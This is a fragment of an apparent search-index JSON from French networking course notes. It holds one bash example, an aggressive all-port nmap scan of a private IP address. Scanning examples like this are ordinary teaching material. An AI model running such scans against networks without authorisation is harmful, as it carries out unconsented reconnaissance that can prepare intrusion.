Blocks","text":"<p>```bash</p>"},{"location":"01_networking/#exemple-de-commande-bash","title":"Exemple de commande bash","text":"<p>nmap -A -p- 192.168.1.10</p>"}]}